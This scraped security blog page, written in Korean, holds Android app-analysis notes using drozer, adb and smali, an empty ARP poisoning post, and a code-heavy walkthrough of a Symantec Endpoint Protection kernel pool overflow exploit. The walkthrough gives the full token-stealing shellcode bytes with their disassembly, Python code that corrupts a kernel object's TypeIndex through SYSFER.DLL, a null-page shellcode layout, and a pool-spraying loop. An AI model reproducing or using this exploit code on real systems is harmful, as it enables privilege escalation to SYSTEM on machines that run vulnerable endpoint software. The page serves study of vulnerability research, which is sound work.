-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; shell
-</span><span class='line'>u0_a59@android:/data/data/com.mwr.dz $ id
-</span><span class='line'>
-</span><span class='line'>dz&gt; run app.package.info -a com.mwr.dz -h
-</span><span class='line'>
-</span><span class='line'>dz&gt; run app.package.info -a com.mwr.dz &gt; /path/to/output.txt</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Retrieving APK Files</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell pm list packages | grep twitter
-</span><span class='line'>package:com.twitter.android</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.list -f "Terminal Emulator"
-</span><span class='line'>jackpal.androidterm (Terminal Emulator)</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell pm path jackpal.androidterm
-</span><span class='line'>package:/data/app/jackpal.androidterm-2.apk</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.info -a jackpal.androidterm
-</span><span class='line'>Package: jackpal.androidterm
-</span><span class='line'>  Application Label: Terminal Emulator
-</span><span class='line'>  Process Name: jackpal.androidterm
-</span><span class='line'>  Version: 1.0.59
-</span><span class='line'>  Data Directory: /data/data/jackpal.androidterm
-</span><span class='line'>  APK Path: /data/app/jackpal.androidterm-2.apk
-</span><span class='line'>  UID: 10215
-</span><span class='line'>  GID: [3003, 1015, 1023, 1028]
-</span><span class='line'>  Shared Libraries: null
-</span><span class='line'>  Shared User ID: null
-</span><span class='line'>  Uses Permissions:
-</span><span class='line'>  - android.permission.INTERNET
-</span><span class='line'>  ...</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><a href="http://apkleecher.com">http://apkleecher.com</a></li>
-<li><a href="http://apps.evozi.com/apk-downloader">http://apps.evozi.com/apk-downloader</a></li>
-</ul>
-
-
-<h4>Viewing Manifests</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ aapt dump xmltree /path/to/agent.apk AndroidManifest.xml
-</span><span class='line'>
-</span><span class='line'>$ aapt l -a /path/to/agent.apk
-</span><span class='line'>
-</span><span class='line'>$ unzip agent.apk
-</span><span class='line'>
-</span><span class='line'>$ java -jar AXMLPrinter2.jar AndroidManifest.xml
-</span><span class='line'>&lt;?xml version="1.0" encoding="utf-8"?&gt;
-</span><span class='line'>&lt;manifest
-</span><span class='line'>    xmlns:android="http://schemas.android.com/apk/res/android"
-</span><span class='line'>    android:versionCode="5"
-</span><span class='line'>    android:versionName="2.3.4"
-</span><span class='line'>    package="com.mwr.dz"&gt;
-</span><span class='line'>    &lt;uses-sdk android:minSdkVersion="7" android:targetSdkVersion="18"&gt;
-</span><span class='line'>    &lt;/uses-sdk&gt;
-</span><span class='line'>...
-</span><span class='line'>
-</span><span class='line'>dz&gt; run app.package.manifest com.mwr.dz
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Activity &amp; Contenet Provider</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.activity.start --action android.intent.action.VIEW --data-uri http://www.google.com --component com.android.browser com.android.browser.BrowserActivity
-</span><span class='line'>
-</span><span class='line'>dz&gt; run app.provider.query content://settings/system</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Permissions</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dz&gt; run app.package.info -a com.android.browser
-</span><span class='line'>Package: com.android.browser
-</span><span class='line'>Application Label: Browser
-</span><span class='line'>Process Name: com.android.browser
-</span><span class='line'>Version: 4.4.2-938007
-</span><span class='line'>Data Directory: /data/data/com.android.browser
-</span><span class='line'>APK Path: /system/app/Browser.apk
-</span><span class='line'>UID: 10014
-</span><span class='line'>GID: [3003, 1028, 1015]
-</span><span class='line'>Shared Libraries: null
-</span><span class='line'>Shared User ID: null
-</span><span class='line'>Users Permissions:
-</span><span class='line'>- android.permission.ACCESS_COARSE_LOCATION
-</span><span class='line'>...
-</span><span class='line'>
-</span><span class='line'>dz&gt; run app.package.list -p android.permission.READ_SMS
-</span><span class='line'>com.android.phone (Phone)
-</span><span class='line'>com.android.mms (Messaging)
-</span><span class='line'>com.android.gallery (Camera)
-</span><span class='line'>com.android.camera (Camera)
-</span><span class='line'>...
-</span><span class='line'>
-</span><span class='line'>dz&gt; run app.provider.info -p android.permission.READ_SMS
-</span><span class='line'>Package: com.android.mms
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Protection Levels</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ drozer agent build --permission android.permission.INSTALL_PACKAGES
-</span><span class='line'>Done: /tmp/tmp2RdLTd/agent.apk
-</span><span class='line'>
-</span><span class='line'>$ adb install /tmp/tmp/2RdLTd/agent.apk
-</span><span class='line'>2312 KB/s (653054 bytes in 0.275s)
-</span><span class='line'>     pkg: /data/local/tmp/agent.apk
-</span><span class='line'>Success
-</span><span class='line'>
-</span><span class='line'>$ adb logcat
-</span><span class='line'>...
-</span><span class='line'>W/PackageManager(  373): Not granting permission
-</span><span class='line'>android.permission.INSTALL_PACKAGES to package com.mwr.dz (protectionLevel=18 flags=0x83e46)
-</span><span class='line'>...
-</span><span class='line'>
-</span><span class='line'>dz&gt; permissions
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Code Signing</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ keytool -genkey -v -keystore mykey.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
-</span><span class='line'>
-</span><span class='line'>$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore application.apk alias_name
-</span><span class='line'>
-</span><span class='line'>$ openssl pkcs7 -inform DER -in CERT.RSA -text -print_certs
-</span><span class='line'>
-</span><span class='line'>$ keytool -printcert -file CERT.RSA</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Dex Tools</h4>
-
-<ul>
-<li>smali/baksmali</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ java -jar baksmali.jar app.apk
-</span><span class='line'>$ jav -jar smali.jar -o classes.dex out/
-</span><span class='line'>
-</span><span class='line'>$ java -jar baksmali.jar -a 19 -x Settings.odex -d framework
-</span><span class='line'>$ java -jar smali.jar -a 19 -o Settings.dex out/</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>IDA</li>
-<li>dex2jar</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ d2j-dex2jar.sh agent.apk -o agent.jar</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>JEB</li>
-<li>apktool</li>
-<li>jadx</li>
-<li>jad</li>
-</ul>
-
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/14/arp-cache-poisoning/">ARP Cache Poisoning</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-14T21:22:47+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:22 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content">
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/14/symantec-endpoint-protection-kernel-pool-overflow/">Symantec Endpoint Protection - Kernel Pool Overflow</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-14T21:21:58+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:21 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="https://www.exploit-db.com/exploits/34272/">Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow</a></p>
-
-<p>참고할만한 문서들은</p>
-
-<ul>
-<li><a href="http://slidegur.com/doc/15815/data-only-pwning-microsoft-windows-kernel">Data-only Pwning Microsoft Windows Kernel: Exploitation of Kernel Pool Overflows on Microsoft Windows 8.1</a></li>
-<li><a href="https://www.youtube.com/watch?v=-smvfojecvs">Project Heapbleed, BalCCon2k14</a></li>
-<li><a href="http://www.slideshare.net/scovetta/kernelpool">Modern Kernel Pool Exploitation: Attacks and Techniques</a></li>
-<li><a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">Kernel Pool Exploitation on Windows 7</a></li>
-<li><a href="http://packetstorm.interhost.co.il/hitb04/hitb04-sk-chong.pdf">Windows Local Kernel Exploitation, HITBSecCon 2004 Kuala Lumpur</a></li>
-<li><a href="http://www.ntdsxtract.com/downloads/Token_Stealing_old.pdf">Access token stealing on Windows, Csaba Barta, 2009</a></li>
-<li><a href="http://www.uninformed.org/?v=3&amp;a=4&amp;t=pdf">Kernel-mode Payloads on Windows, bugcheck and skape</a></li>
-<li><a href="http://www.uninformed.org/?v=6&amp;a=2&amp;t=pdf">Exploiting 802.11 Wireless Driver Vulnerabilities on Windows</a></li>
-<li><a href="http://www.blackhat.com/presentations/bh-usa-05/BH_US_05-Jack_White_Paper.pdf">Remote Windows Kernel Exploitation: Step into the Ring 0</a></li>
-<li><a href="http://securityvulns.ru/docs4946.html">Win32 Device Drivers Communication Vulnerabilities, Lord Yup</a></li>
-<li><a href="http://www.suse.de/~krahmer/no-nx.pdf">x86-64 Buffer Overflow Exploits and the Borrowed Code Chunks Exploitation Technique</a></li>
-<li>infamous HalDispatchTable</li>
-<li>j00ru&rsquo;s research</li>
-<li><a href="http://www.alex-ionescu.com/?p=231">Alex&rsquo;s lonescu research</a></li>
-<li>Nikita Tarakanov. Kernel Pool Overflow from Windows XP to Windows 8. ZeroNights, 2011</li>
-<li>Kostya Kortchinsky. Real world kernel pool exploitation. SyScan, 2008</li>
-<li>SoBeIt. How to exploit Windows kernel memory pool. X’con, 2005</li>
-<li><a href="http://illmatics.com/Windows%208%20Heap%20Internals.pdf">Windows 8 Heap Internals</a></li>
-<li><a href="https://media.blackhat.com/bh-eu-12/Lee/bh-eu-12-Lee-GDI_Font_Fuzzing-WP.pdf">GDI Font Fuzzing in Windows Kernel for Fun</a></li>
-<li><a href="http://www.nosuchcon.org/talks/2013/D3_02_Nikita_Exploiting_Hardcore_Pool_Corruptions_in_Microsoft_Windows_Kernel.pdf">Exploiting Hardcore Pool Corruptions in Microsoft Windows Kernel</a></li>
-<li><a href="http://j00ru.vexillium.org/?p=290">GDT and LDT in Windows kernel vulnerability exploitation</a></li>
-<li>SoBelt X'con 2005</li>
-<li>Kostya Kortchinsky SyScan 2008</li>
-<li>Tarjei Mandt BH DC 2011</li>
-</ul>
-
-
-<h4>Exploit Strategy</h4>
-
-<p><a href="http://rce4fun.blogspot.kr/2014/07/okaytocloseprocedure-callback-kernel_9.html">OkayToCloseProcedure callback kernel hook</a></p>
-
-<ul>
-<li>IoCompletionReserve object 로 spraying 을 한다음에, close 를 해줘서 hole 을 만든다.</li>
-<li>ioctl() 을 해서 hole 사이에 메모리를 alloc 하고, next object 의 Type Index 를 0 으로 만들어서 type confusion 을 일으킨다.</li>
-<li>이제 handle 을 close 하면, type confusion 때문에 엉뚱한 주소에서 OkayToCloseProcedure 를 읽는다.</li>
-<li>OkayToCloseProcedure 에는 0x00000078 을 넣어놓고, 0x00000078 에는 shellcode 를 세팅해둔다.</li>
-<li>Shellcode 는 Type Index 를 repair 하고, <code>nt authority\SYSTEM</code> 을 훔친다.</li>
-</ul>
-
-
-<h4>Token Stealing Shellcode</h4>
-
-<p>Exploit 에서 사용된 shellcode 는 token stealing shellcode.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>tokenstealing = (
-</span><span class='line'>"\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
-</span><span class='line'>"\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
-</span><span class='line'>"\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
-</span><span class='line'>"\x00"
-</span><span class='line'>)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Disassemble 해봤다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>33c0                    xor eax,eax
-</span><span class='line'>648b8024010000          mov eax,DWORD PTR fs:[eax+0x124]
-</span><span class='line'>8b4050                  mov eax,DWORD PTR [eax+0x50]
-</span><span class='line'>8bc8                    mov ecx,eax
-</span><span class='line'>loc_0000000e:
-</span><span class='line'>8b80b8000000            mov eax,DWORD PTR [eax+0xb8]
-</span><span class='line'>2db8000000              sub eax,0xb8
-</span><span class='line'>83b8b400000004          cmp DWORD PTR [eax+0xb4],0x4
-</span><span class='line'>75ec                    jne loc_0000000e
-</span><span class='line'>8b90f8000000            mov edx,DWORD PTR [eax+0xf8]
-</span><span class='line'>8991f8000000            mov DWORD PTR [ecx+0xf8],edx
-</span><span class='line'>c21000                  ret 0x10</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>EPROCESS</code> 구조체에서 <code>Token</code> 필드를 조작한다. 상위권한을 가지고 있는 프로세스의 토큰을 카피해 놓는 것이다.
-<code>SYSTEM</code> 프로세스에서 카피하는데 XP, 2003, Vista 에서는 PID 0x4.</p>
-
-<p>Target 이 IDLE 상태라면, <code>FS:[0x124]</code> 가 ETHREAD 를 가리키니까 여기서 EPROCESS 를 구한다.</p>
-
-<h4>Hotpatching SYSFER.DLL</h4>
-
-<ol>
-<li>VirtualAllocEx() 로 cmd.exe 프로세스 내부에 메모리를 할당받는다.</li>
-<li>할당받은 메모리에 크기 <code>0x44c</code> 만큼의 악의적인 데이터를 깔아놓는다. 나중에 이걸로 kernel memory 를 오염시킬것이다.</li>
-<li>SEP 가 cmd.exe 에 inject 한 SYSFER.dll 의 주소를 찾는다.</li>
-<li>저 주소를 베이스로, GetProcAddress() 를 써서 SYSFER.DLL 이 export 한 <code>child_block</code> 과 <code>child_block_size</code> 의 주소를 찾아낸다.</li>
-<li>2 번의 메모리 주소로 <code>child_block</code> 을 overwrite 한다. 이제 <code>child_block</code> 은 악의적인 데이터를 포인팅한다.</li>
-<li><code>0x44c</code> 로 <code>child_block_size</code> 를 overwrite 한다.</li>
-</ol>
-
-
-<h4>Evil child_block</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>""" Allocate the source buffer in the parent process """
-</span><span class='line'>v = kernel32.VirtualAllocEx(phandle, 
-</span><span class='line'>        0x0, 
-</span><span class='line'>        evil_child_block_size, 
-</span><span class='line'>        MEM_RESERVE|MEM_COMMIT, 
-</span><span class='line'>        PAGE_EXECUTE_READWRITE)
-</span><span class='line'># 8654c580  040c0090 ef436f49 00000000 0000005c
-</span><span class='line'># 8654c590  00000000 00000000 00000001 00000001
-</span><span class='line'># 8654c5a0  00000000 0008000a
-</span><span class='line'>quota   = "\x00\x00\x00\x00"   
-</span><span class='line'>header  = "\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00"
-</span><span class='line'>header += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
-</span><span class='line'>header += "\x00\x00\x00\x00"
-</span><span class='line'># TypeIndex = "\x0a\x00\x08\x00"
-</span><span class='line'>TypeIndex = "\x00\x00\x08\x00"
-</span><span class='line'>offset    = "\x45" * (evil_child_block_size-len(header)-len(TypeIndex)-len(quota))
-</span><span class='line'>overflow  = offset + quota + header + TypeIndex 
-</span><span class='line'>csrc      = create_string_buffer(overflow, evil_child_block_size)
-</span><span class='line'>wrote     = c_ulong(0)
-</span><span class='line'>res = kernel32.WriteProcessMemory(phandle, v, 
-</span><span class='line'>        addressof(csrc), 
-</span><span class='line'>        evil_child_block_size, 
-</span><span class='line'>        byref(wrote))</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>IoCompletionReserve</code> 오브젝트를 overwrite 할 것인데, <code>TypeIndex</code> 가 원래는 <code>0x0A</code> 인데 <code>0x00</code> 으로 overwrite 해서 Type Confusion 을 일으킨다. CloseHandle() 할 때, 찾아갈 OkayToCloseProcedure 가 엉뚱한 곳으로 튀게 된다.</p>
-
-<p>아래의 <code>TypeIndex</code> 를 0 으로 overwrite 한다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_HEADER
-</span><span class='line'>+0x000 PointerCount : Int4B
-</span><span class='line'>+0x004 HandleCount : Int4B
-</span><span class='line'>+0x004 NextToFree : Ptr32 Void
-</span><span class='line'>+0x008 Lock : _EX_PUSH_LOCK
-</span><span class='line'>+0x00c TypeIndex : UChar &lt;- Index of pointer to OBJECT_TYPE structure in ObTypeIndexTable
-</span><span class='line'>+0x00d TraceFlags : Uchar
-</span><span class='line'>+0x00d DbgRefTrace : Pos 0, 1 Bit
-</span><span class='line'>+0x00d DbgTracePermanent : Pos 1, 1 Bit
-</span><span class='line'>+0x00e InfoMask : UChar
-</span><span class='line'>+0x00f Flags : UChar
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>ObTypeIndexTable</code> 을 보면,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dd nt!ObTypeIndexTable 
-</span><span class='line'>81a3edc0 00000000 bad0b0b0 85543768 855436a0
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이제 0x85543768 을 _OBJECT_TYPE 으로 덤프해보자.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt _OBJECT_TYPE 85543768
-</span><span class='line'>+0x000 TypeList             : _LIST_ENTRY [ 0x85543740 - 0x869c6738 ]
-</span><span class='line'>...
-</span><span class='line'>+0x028 TypeInfo             : _OBJECT_TYPE_INITIALIZER
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이제 TypeInfo 를 까보자.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_TYPE_INITIALIZER 0x85543768+0x28
-</span><span class='line'>+0x000 Length               : 0x50
-</span><span class='line'>...
-</span><span class='line'>+0x04c OkayToCloseProcedure : (null)</span></code></pre></td></tr></table></div></figure>
-
-
-<p><code>0x28</code> + <code>0x4c</code> = <code>0x74</code> 이니까, <code>Type Index</code> 를 0 으로 세팅하면 <code>0x00000000 + 0x74</code> 에서 <code>OkayToCloseProcedure</code> 를 읽게된다.</p>
-
-<h4>allocShellcode()</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>"\x42" * 0x70
-</span><span class='line'>
-</span><span class='line'>OkayToCloseProcedure (0x00000078)
-</span><span class='line'>
-</span><span class='line'>ADD ESI,0C
-</span><span class='line'>MOV DWORD PTR DS:[ESI],8000A
-</span><span class='line'>SUB ESI,0C # RESTORE TypeIndex
-</span><span class='line'>
-</span><span class='line'>xor eax,eax # Token stealing shellcode
-</span><span class='line'>mov eax,DWORD PTR fs:[eax+0x124]
-</span><span class='line'>mov eax,DWORD PTR [eax+0x50]
-</span><span class='line'>mov ecx,eax
-</span><span class='line'>loc_0000000e:
-</span><span class='line'>mov eax,DWORD PTR [eax+0xb8]
-</span><span class='line'>sub eax,0xb8
-</span><span class='line'>cmp DWORD PTR [eax+0xb4],0x4
-</span><span class='line'>jne loc_0000000e
-</span><span class='line'>mov edx,DWORD PTR [eax+0xf8]
-</span><span class='line'>mov DWORD PTR [ecx+0xf8],edx
-</span><span class='line'>ret 0x10
-</span><span class='line'>
-</span><span class='line'>"\x90"
-</span><span class='line'>"\x90"
-</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이 쉘코드를 NtAllocateVirtualMemory() 로 <code>0x00000004</code> 에 allocate 한다.</p>
-
-<h4>Spray()</h4>
-
-<p>Spray the kernel pool with IoCompletionReserve objects. Each object is 0x60 bytes in length and is allocated
-from the non-paged kernel pool.</p>
-
-<p>When applications need failure-free delivery of an I/O completion port message, or packet. Typically,
-packets are sent with the PostQueuedCompletionStatus API in Kernelbase.dll, which calls NtSetIoCompletion
-API. Similarly to the user APC, the kernel must allocate an I/O manager structure to contain the completion-packet information,
-and if this allocation failes, the packet cannot be created. With reserve objects, the application can use the
-NtAllocateReserveObject API on startup to have the kernel pre-allocate the I/O completion packet, and the
-NtSetIoCompletionEx system call can be used to supply a handle to this reserve object, guaranteeing a success path.</p>
-
-<p>exploit 을 시작할 시점에는 kernel pool 이 fragmented 되어있기 마련이라, 구멍을 채워줘야한다. 현재 있는 page 들을 꽉 채우고,
-그 이후부터 allocation 을 때리면, 새로운 page 에 sequential 하게 일어날 가능성이 높아진다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>global handles, done
-</span><span class='line'>handles = {}
-</span><span class='line'>for i in range(0,5000):
-</span><span class='line'>    hHandle = HANDLE(0)
-</span><span class='line'>    ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
-</span><span class='line'>    handles[hHandle.value] = hHandle</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li><a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">Exploits for MS10-058, Jeremy Fetiveau</a></li>
-<li><a href="http://blog.ptsecurity.com/2013/03/stars-aligners-how-to-kernel-pool.html">Stars aligner’s how-to: kernel pool spraying and VMware CVE-2013-1406</a></li>
-</ul>
-
-
-<h4>NtAllocateReserveObject()</h4>
-
-<p>In short, <code>NtAllocateReserveObject</code> makes it possible for any system user to allocate a buffer
-on the non-paged kernel pool, and obtain a HANDLE representation of this buffer in user-mode.
-As it will turn out later in this paper, the above can give us pretty much control over the
-kernel memory, when exploiting custom vulnerabilities.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
